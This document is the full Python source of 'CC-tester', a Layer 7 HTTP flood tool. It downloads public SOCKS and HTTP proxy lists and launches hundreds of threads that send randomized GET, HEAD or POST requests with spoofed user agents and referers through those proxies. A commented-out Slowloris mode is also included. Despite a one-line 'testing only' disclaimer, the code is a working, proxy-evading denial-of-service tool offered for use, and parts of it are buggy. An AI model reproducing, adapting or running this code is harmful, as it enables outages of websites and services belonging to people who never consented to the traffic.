#!/usr/bin/python3
import requests
import socket
import socks
import time
import random
import threading
import sys
import ssl
import datetime
import os
import string
import re
import gzip


referers = [
	"https://check-host.net/",
	"https://www.facebook.com/",
	"https://www.youtube.com/",
	"https://away.vk.com/",
	"",
	"https://www.bing.com/search?q=",
	"https://r.search.yahoo.com/",
	"https://vk.com/profile.php?redirect=",
	"https://steamcommunity.com/market/search?q=",
	"https://play.google.com/store/search?q=",
	"https://www.google.ru/search?q=",
	"https://www.google.com/search?q=",
	"https://www.google.com.ua/search?q=",
]

######### Default values ########
mode = "cc"
url = ""
proxy_type = "5"
brute = False
out_file = "proxy.txt"
thread_num = 800
data = ""
cookies = ""
proxy_timeout = 3
debug = False
ind_dict = {}
responses = {}
###################################################
Intn = random.randint
Choice = random.choice
###################################################
def buildThreads(mode,thread_num,event,proxy_type,proxy_timeout):
	for _ in range(thread_num):
		func = globals()[mode]
		th = threading.Thread(target = func,args=(event,proxy_type,proxy_timeout,))
		th.daemon = True
		th.start()


def generateAcceptHeader():
	accept = Choice([
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n",
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n",
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n",
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n",
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\r\n",
		"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\n",
		"Accept: text/html, application/xhtml+xml, image/jxr, */*\r\n",
		"Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\n",
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8",

	])

	lang = Choice([
		"Accept-Language: ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7,uk;q=0.6\r\n",
		"Accept-Language: ru-RU,ru;q=0.9,en-US;q=0.8\r\n",
		"Accept-Language: ru-RU,ru;q=0.9,en;q=0.8\r\n"
		"Accept-Language: ru-RU,ru;q=0.9,uk;q=0.8\r\n"
		"Accept-Language: en-US,en;q=0.9,ru;q=0.8\r\n"
	])

	encoding = Choice([
		"Accept-Encoding: gzip, deflate\r\n",
		"Accept-Encoding: gzip\r\n",
		"Accept-Encoding: deflate, br\r\n",
		"Accept-Encoding: gzip, deflate, br\r\n",
		"Accept-Encoding: identity\r\n",
		"Accept-Encoding: deflate, gzip;q=1.0, *;q=0.5\r\n",
		"Accept-Encoding: gzip, compress\r\n",
		"Accept-Encoding: compress, gzip;q=1.0, *;q=0.5\r\n",
		"Accept-Encoding: gzip;q=1.0, deflate;q=0.6, br;q=0.2\r\n",
	])

	return accept + lang + encoding


def getUserAgent():
	platform = Choice(['Macintosh', 'Windows', 'X11'])
	if platform == 'Macintosh':
		os = Choice(['68K', 'PPC', 'Intel Mac OS X'])
	elif platform == 'Windows':
		rand = Intn(0, 100)
		if rand > 90:
			os = Choice(['WindowsCE', 'Windows XP', 'Windows 7'])
		else:
			os = Choice(['Windows 8', 'Windows NT 10.0; Win64; x64'])
	elif platform == 'X11':
		os = Choice(['Linux i686', 'Linux x86_64'])
	browser = Choice(['chrome', 'firefox', 'ie'])
	if browser == 'chrome':
		webkit = str(Intn(500, 599))
		version = str(Intn(0, 99)) + '.0' + str(Intn(0, 9999)) + '.' + str(Intn(0, 999))
		return 'Mozilla/5.0 (' + os + ') AppleWebKit/' + webkit + '.0 (KHTML, like Gecko) Chrome/' + version + ' Safari/' + webkit
	elif browser == 'firefox':
		currentYear = datetime.date.today().year
		year = str(Intn(2020, currentYear))
		month = Intn(1, 12)
		if month < 10:
			month = '0' + str(month)
		else:
			month = str(month)
		day = Intn(1, 30)
		if day < 10:
			day = '0' + str(day)
		else:
			day = str(day)
		gecko = year + month + day
		version = str(Intn(1, 72)) + '.0'
		return 'Mozilla/5.0 (' + os + '; rv:' + version + ') Gecko/' + gecko + ' Firefox/' + version
	elif browser == 'ie':
		version = str(Intn(1, 99)) + '.0'
		engine = str(Intn(1, 99)) + '.0'
		option = Choice([True, False])
		if option == True:
			token = Choice(['.NET CLR', 'SV1', 'Tablet PC', 'Win64; IA64', 'Win64; x64', 'WOW64']) + '; '
		else:
			token = ''
		return 'Mozilla/5.0 (compatible; MSIE ' + version + '; ' + os + '; ' + token + 'Trident/' + engine + ')'

def randomUrl():
	return ''.join(random.choices(string.ascii_uppercase + string.digits, k=Intn(32, 64)))

def GenReqHeader(method):
	global data
	global target
	global path

	header = ""
	sec = ""

	useragent = "User-Agent: " + getUserAgent() + ""
	if os == "Windows NT 10.0; Win64; x64":
		sec = ""
		sec += "sec-ch-ua-mobile: ?0\r\n"
		sec += "sec-ch-ua-platform: \"Windows\"\r\n"
		sec += "sec-fetch-dest: document\r\n"
		sec += "sec-fetch-mode: navigate\r\n"
		sec += "sec-fetch-site: none\n\r"
		sec += "sec-fetch-user: ?1\r\n"
		sec += "upgrade-insecure-requests: 1\r\n"

	if Intn(1, 2) == 1:
		rv = Intn(100, 106)
		useragent += "; rv:" + str(rv) + ".0"
	useragent += "\r\n"

	accept = generateAcceptHeader()
	if cookies != "":
		connection += "Cookies: "+str(cookies)+"\r\n"

	if method == "get" or method == "head":
		connection = "Connection: Keep-Alive\r\n"
		referer = "Referer: "+Choice(referers)+ target + path + "\r\n"
		header = referer + useragent + accept + connection + sec + "\r\n"
	elif method == "post":
		post_host = "POST " + path + " HTTP/1.1\r\nHost: " + target + "\r\n"
		content = "Content-Type: application/x-www-form-urlencoded\r\nX-requested-with:XMLHttpRequest\r\n"
		refer = "Referer: http://"+ target + path + "\r\n"
		if data == "":# You can enable customize data
			data = str(random._urandom(16))
		length = "Content-Length: "+str(len(data))+" \r\nConnection: Keep-Alive\r\n"
		header = post_host + accept + refer + content + useragent + sec + length + "\n" + data + "\r\n\r\n"
	return header

def ParseUrl(original_url):
	global target
	global path
	global port
	global protocol

	original_url = original_url.strip()
	url = ""
	path = "/"#default value
	port = 80 #default value
	protocol = "http"
	#http(s)://www.example.com:1337/xxx
	if original_url[:7] == "http://":
		url = original_url[7:]
	elif original_url[:8] == "https://":
		url = original_url[8:]
		protocol = "https"
	else:
		print("> That looks like not a correct url.")
		exit()
	#http(s)://www.example.com:1337/xxx ==> www.example.com:1337/xxx
	#print(url) #for debug
	tmp = url.split("/")
	website = tmp[0]#www.example.com:1337/xxx ==> www.example.com:1337
	check = website.split(":")
	if len(check) != 1:#detect the port
		port = int(check[1])
	else:
		if protocol == "https":
			port = 443
	target = check[0]
	if len(tmp) > 1:
		path = url.replace(website,"",1)#get the path www.example.com/xxx ==> /xxx

def InputOption(question,options,default):
	ans = ""
	while ans == "":
		ans = str(input(question)).strip().lower()
		if ans == "":
			ans = default
		elif ans not in options:
			print("> Please enter the correct option")
			ans = ""
			continue
	return ans

def cc(event,proxy_type,proxy_timeout):
	global ind_dict
	header = GenReqHeader("get")
	proxy = Choice(proxies).strip().split(":")
	add = "?"
	if "?" in path:
		add = "&"
	event.wait()
	while True:
		try:
			s = socks.socksocket()
			if proxy_type == "4":
				s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
			if proxy_type == "5":
				s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
			if proxy_type == "http":
				s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
			if brute:
				s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
			s.settimeout(proxy_timeout)
			s.connect((str(target), int(port)))
			if protocol == "https":
				ctx = ssl.SSLContext()
				s = ctx.wrap_socket(s,server_hostname=target)
			try:
				for _ in range(multiple):
					get_host = "GET " + path + add + randomUrl() + " HTTP/1.1\r\nHost: " + target + "\r\n"
					request = get_host + header
					sent = s.send(str.encode(request))
					if not sent:
						proxy = Choice(proxies).strip().split(":")
						break

					try:
						buffer = b''

						result = s.recv(10000)
						while (len(result) > 0):
							buffer += result
							result = s.recv(10000)

						if len(buffer) > 0:
							decoded = buffer.decode('utf8')
							res = re.search("HTTP/1.1 (\d{1,})", decoded)
							code = res.group(1)

							addCodeRes(code, proxy)
					except Exception as ex:
						addCodeRes(code, proxy)

				#s.setsockopt(socket.SO_LINGER,0)
				s.close()
			except Exception as ex:
				if debug:
					print(str(ex))
				s.close()
				addCodeRes("error", proxy)
		except Exception as ex:
			if debug:
				print(str(ex))
			s.close()
			addCodeRes("error", proxy)


def addCodeRes(code, proxy):
	if(code in responses):
		responses[code] += 1
	else:
		responses[code] = 1

	ind_dict[(proxy[0]+":"+proxy[1]).strip()] += 1


def head(event,proxy_type,proxy_timeout):
	global ind_dict
	header = GenReqHeader("head")
	proxy = Choice(proxies).strip().split(":")
	add = "?"
	if "?" in path:
		add = "&"
	event.wait()
	while True:
		try:
			s = socks.socksocket()
			if proxy_type == "4":
				s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
			if proxy_type == "5":
				s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
			if proxy_type == "http":
				s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
			if brute:
				s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
			s.settimeout(proxy_timeout)
			s.connect((str(target), int(port)))
			if protocol == "https":
				ctx = ssl.SSLContext()
				s = ctx.wrap_socket(s,server_hostname=target)
			try:
				for _ in range(multiple):
					head_host = "HEAD " + path + add + randomUrl() + " HTTP/1.1\r\nHost: " + target + "\r\n"
					request = head_host + header
					sent = s.send(str.encode(request))
					if not sent:
						proxy = Choice(proxies).strip().split(":")
						break#   This part will jump to dirty fix

					ind_dict[(proxy[0]+":"+proxy[1]).strip()] += 1
				s.close()
			except:
				s.close()
		except:#dirty fix
			s.close()

def post(event,proxy_type,proxy_timeout):
	global ind_dict
	request = GenReqHeader("post")
	proxy = Choice(proxies).strip().split(":")
	event.wait()
	while True:
		try:
			s = socks.socksocket()
			if proxy_type == "4":
				s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
			if proxy_type == "5":
				s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
			if proxy_type == "http":
				s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
			if brute:
				s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
			s.settimeout(proxy_timeout)
			s.connect((str(target), int(port)))
			if protocol == "https":
				ctx = ssl.SSLContext()
				s = ctx.wrap_socket(s,server_hostname=target)
			try:
				for _ in range(multiple):
					sent = s.send(str.encode(request))
					if not sent:
						proxy = Choice(proxies).strip().split(":")
						break

					ind_dict[(proxy[0]+":"+proxy[1]).strip()] += 1
				s.close()
			except:
				s.close()
		except:
			s.close()
''' idk why it's not working, so i temporarily removed it
def slow_atk_conn(proxy_type,rlock):
	global socket_list
	proxy = Choice(proxies).strip().split(":")
	while 1:
		try:
			s = socks.socksocket()
			if proxy_type == "4":
				s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
			if proxy_type == "5":
				s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
if proxy_type == "http":
				s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
			s.settimeout(proxy_timeout)
			s.connect((str(target), int(port)))
			if str(port) == '443':
				ctx = ssl.SSLContext()
				s = ctx.wrap_socket(s,server_hostname=target)
			s.send("GET /?{} HTTP/1.1\r\n".format(Intn(0, 2000)).encode("utf-8"))# Slowloris format header
			s.send("User-Agent: {}\r\n".format(getUserAgent()).encode("utf-8"))
			s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
			if cookies != "":
				s.send(("Cookies: "+str(cookies)+"\r\n").encode("utf-8"))
			s.send(("Connection:keep-alive").encode("utf-8"))
			rlock.acquire()
			socket_list.append(s)
			rlock.release()
			return
		except:
			#print("Connection failed")
			s.close()
			proxy = Choice(proxies).strip().split(":")#Only change proxy when error, increase the performance

socket_list=[]
def slow(conn,proxy_type):
	global socket_list
	rlock = threading.Lock
	for _ in range(conn):
		threading.Thread(target=slow_atk_conn,args=(proxy_type,rlock,),daemon=True).start()
	while True:
		sys.stdout.write("[*] Running Slow test || Connections: "+str(len(socket_list))+"\r")
		sys.stdout.flush()
		if len(socket_list) != 0 :
			for s in list(socket_list):
				try:
					s.send("X-a: {}\r\n".format(Intn(1, 5000)).encode("utf-8"))
					sys.stdout.write("[*] Running Slow test || Connections: "+str(len(socket_list))+"\r")
					sys.stdout.flush()
				except:
					s.close()
					socket_list.remove(s)
					sys.stdout.write("[*] Running Slow test || Connections: "+str(len(socket_list))+"\r")
					sys.stdout.flush()
			proxy = Choice(proxies).strip().split(":")
			for _ in range(conn - len(socket_list)):
				threading.Thread(target=slow_atk_conn,args=(proxy_type,rlock,),daemon=True).start()
		else:
			time.sleep(0.1)
'''

nums = 0
valid = 0

def checking(lines,proxy_type,ms,rlock,):
	global nums
	global proxies
	global valid

	proxy = lines.strip().split(":")
	if len(proxy) != 2:
		rlock.acquire()
		proxies.remove(lines)
		rlock.release()
		return
	err = 0
	while True:
		if err >= 3:
			rlock.acquire()
			proxies.remove(lines)
			rlock.release()
			break
		try:
			s = socks.socksocket()
			if proxy_type == "4":
				s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
			if proxy_type == "5":
				s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
			if proxy_type == "http":
				s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))

			s.settimeout(ms)
			s.connect(("1.1.1.1", 443))

			ctx = ssl.SSLContext()
			s = ctx.wrap_socket(s,server_hostname=target)

			sent = s.send(str.encode("GET / HTTP/1.1\r\n\r\n"))
			if not sent:
				err += 1
			s.close()
			valid += 1
			break
		except:
			err +=1
	nums += 1

def checkSocks(ms):
	global nums
	global valid

	thread_list=[]
	rlock = threading.RLock()
	for lines in list(proxies):
		th = threading.Thread(target=checking,args=(lines,proxy_type,ms,rlock,))
		th.start()

		thread_list.append(th)
		time.sleep(0.01)
		sys.stdout.write("> Checked "+str(nums)+" proxies, valid: " + str(valid) + "\r")
		sys.stdout.flush()
	for th in list(thread_list):
		th.join()
		sys.stdout.write("> Checked "+str(nums)+" proxies, valid: " + str(valid) + "\r")
		sys.stdout.flush()
	print("\r\n> Checked all proxies, Total Worked:"+str(len(proxies)))
	#ans = input("> Do u want to save them in a file? (y/n, default=y)")
	#if ans == "y" or ans == "":
	with open(out_file, 'wb') as fp:
		for lines in list(proxies):
			fp.write(bytes(lines,encoding='utf8'))
		fp.close()
	print("> They are saved in "+out_file)

def checkList(socks_file):
	temp = open(socks_file).readlines()
	temp_list = []
	for i in temp:
		if i not in temp_list:
			if ':' in i and '#' not in i:
				try:
					socket.inet_pton(socket.AF_INET,i.strip().split(":")[0])#check valid ip v4
					temp_list.append(i)
				except:
					pass
	rfile = open(socks_file, "wb")
	for i in list(temp_list):
		rfile.write(bytes(i,encoding='utf-8'))
	rfile.close()

def DownloadProxies(proxy_type):
	if proxy_type == "4":
		f = open(out_file,'wb')
		socks4_api = [
			"https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&country=all",
			"https://www.proxy-list.download/api/v1/get?type=socks4",
			"https://www.proxyscan.io/download?type=socks4",
			"https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
			'https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks4.txt',
			"https://api.openproxylist.xyz/socks4.txt",
			"https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks4.txt",
			"https://www.freeproxychecker.com/result/socks4_proxies.txt",
			"https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS4_RAW.txt",
		]
		for api in socks4_api:
			try:
				r = requests.get(api,timeout=5)
				f.write(r.content)
			except:
				pass
		f.close()
		try:#credit to All3xJ
			r = requests.get("https://www.socks-proxy.net/",timeout=5)
			part = str(r.content)
			part = part.split("<tbody>")
			part = part[1].split("</tbody>")
			part = part[0].split("<tr><td>")
			proxies = ""
			for proxy in part:
				proxy = proxy.split("</td><td>")
				try:
					proxies=proxies + proxy[0] + ":" + proxy[1] + "\n"
				except:
					pass
				fd = open(out_file,"a")
				fd.write(proxies)
				fd.close()
		except:
			pass
	if proxy_type == "5":
		f = open(out_file,'wb')
		socks5_api = [
			"https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all&simplified=true",
			"https://www.proxy-list.download/api/v1/get?type=socks5",
			"https://www.proxyscan.io/download?type=socks5",
			"https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
			"https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
			"https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt",
			"https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks5.txt",
			"https://api.openproxylist.xyz/socks5.txt",
			"https://www.freeproxychecker.com/result/socks5_proxies.txt",
			#"http://www.socks24.org/feeds/posts/default"
		]
		for api in socks5_api:
			try:
				r = requests.get(api,timeout=5)
				f.write(r.content)
			except:
				pass
		f.close()
	if proxy_type == "http":
		f = open(out_file,'wb')
		http_api = [
			"https://api.proxyscrape.com/?request=displayproxies&proxytype=http",
			"https://www.proxy-list.download/api/v1/get?type=http",
			"https://www.proxyscan.io/download?type=http",
			#"http://spys.me/proxy.txt",
			"https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
			"https://api.openproxylist.xyz/http.txt",
			"https://raw.githubusercontent.com/shiftytr/proxy-list/master/proxy.txt",
			"http://alexa.lr2b.com/proxylist.txt",
			"http://rootjazz.com/proxies/proxies.txt",
			"https://www.freeproxychecker.com/result/http_proxies.txt",
			"http://proxysearcher.sourceforge.net/Proxy%20List.php?type=http",
			"https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt",
			"https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
			"https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.txt",
			"https://raw.githubusercontent.com/opsxcq/proxy-list/master/list.txt"
			"https://proxy-spider.com/api/proxies.example.txt",
			"https://multiproxy.org/txt_all/proxy.txt",
			"https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
			"https://raw.githubusercontent.com/UserR3X/proxy-list/main/online/http.txt",
			"https://raw.githubusercontent.com/UserR3X/proxy-list/main/online/https.txt",
		]
		for api in http_api:
			try:
				r = requests.get(api,timeout=5)
				f.write(r.content)
			except:
				pass
		f.close()
	print("> Have already downloaded proxies list as "+out_file)

def printHelp():
	print('''===============  CC-tester help list  ===============
   -h/help   | showing this message
   -url      | set target url
   -m/mode   | set program mode
   -data     | set post data path (only works on post mode)
             | (Example: -data data.json)
   -cookies  | set cookies (Example: 'id:xxx;ua:xxx')
   -v        | set proxy type (4/5/http, default:5)
   -t        | set threads number (default:800)
   -f        | set proxies file (default:proxy.txt)
   -b        | enable/disable brute mode
             | Enable=1 Disable=0  (default:0)
   -s        | set test time(0 to inf, default:inf)
   -p		 | set proxy timeout in seconds (default 3)
   -down     | download proxies
   -check    | check proxies
   -debug	 | debug mode
=====================================================''')


def setupIndDict():
	global ind_dict
	for proxy in proxies:
		ind_dict[proxy.strip()] = 0


def printStat():
	while True:
		total = 0
		for k,v in ind_dict.items():
			total += v
			ind_dict[k] = 0

		sys.stdout.write("> CC tester | Total Rps: " + str(total) + " - responses: " + str(responses) + "\r")
		sys.stdout.flush()

		time.sleep(1)


def main():
	global proxy_type
	global data
	global cookies
	global brute
	global url
	global out_file
	global thread_num
	global mode
	global target
	global proxies
	global proxy_timeout
	global debug
	global multiple

	print('''
    	   /////    /////    /////////////
    	  CCCCC/   CCCCC/   | CC-tester |/
    	 CC/      CC/       |-----------|/
    	 CC/      CC/       |  Layer 7  |/
    	 CC/////  CC/////   | test tool |/
    	  CCCCC/   CCCCC/   |___________|/
    >--------------------------------------------->
    Version 3.7.1 (2022/3/24)
                                  Coded by L330n123
                                  Modified by bloodsbro
    ┌─────────────────────────────────────────────┐
    │       Tos: Do not use for bad purposes      │
    │      Use only on your sites for testing     │
    ├─────────────────────────────────────────────┤
    │ Link: https://github.com/bloodsbro/CC-tester│
    └─────────────────────────────────────────────┘''')

	target = ""
	check_proxies = False
	download_socks = False
	period = 0
	help = False
	multiple = 100

	for n,args in enumerate(sys.argv):
		if args == "-help" or args =="-h":
			help =True
		if args=="-url":
			ParseUrl(sys.argv[n+1])
		if args=="-m" or args=="-mode":
			mode = sys.argv[n+1]
			if mode not in ["cc","post","head"]:#,"slow"]:
				print("> -m/-mode argument error")
				return
		if args =="-v":
			proxy_type = sys.argv[n+1]
			if proxy_type not in ["4","5","http"]:
				print("> -v argument error (only 4/5/http)")
				return
		if args == "-b":
			if sys.argv[n+1] == "1":
				brute = True
			elif sys.argv[n+1] == "0":
				brute = False
			else:
				print("> -b argument error")
				return
		if args == "-t":
			try:
				thread_num = int(sys.argv[n+1])
			except:
				print("> -t must be integer")
				return
		if args == "-p":
			try:
				proxy_timeout = int(sys.argv[n+1])
			except:
				print("> -p must be integer")
				return
		if args == "-cookies":
			cookies = sys.argv[n+1]
		if args == "-data":
			data = open(sys.argv[n+1],"r",encoding="utf-8", errors='ignore').readlines()
			data = ' '.join([str(txt) for txt in data])
		if args == "-f":
			out_file = sys.argv[n+1]
		if args == "-down":
			download_socks=True
		if args == "-check":
			check_proxies = True
		if args == "-s":
			try:
				period = int(sys.argv[n+1])
			except:
				print("> -s must be integer")
				return
		if args == '-debug':
			debug = True

	print("> Mode: " + mode)

	if download_socks:
		DownloadProxies(proxy_type)

	if os.path.exists(out_file)!=True:
		print("Proxies file not found")
		return

	checkList(out_file)
	proxies = open(out_file).readlines()

	print("> Number of proxies: %d" %(len(proxies)))
	if check_proxies:
		checkSocks(proxy_timeout)
		print("> Number of valid proxies: %d" %(len(proxies)))

	proxies = open(out_file).readlines()

	if len(proxies) <= 0:
		print("> There are no more proxies. Please download a new proxies list.")
		return

	if help:
		printHelp()

	if target == "":
		print("> There is no target. End of process ")
		return
	'''
	if mode == "slow":
		th = threading.Thread(target=slow,args=(thread_num,proxy_type,))
		th.daemon = True
		th.start()
	else:'''
	event = threading.Event()
	print("> Building threads...")
	setupIndDict()
	buildThreads(mode,thread_num,event,proxy_type,proxy_timeout)
	event.clear()
	#input("Press Enter to continue.")
	event.set()
	print("> Flooding...")

	threading.Thread(target=printStat,args=(),daemon=True).start()

	if period > 0:
		time.sleep(period)
	else:
		while True:
			time.sleep(1)

if __name__ == "__main__":
	main()
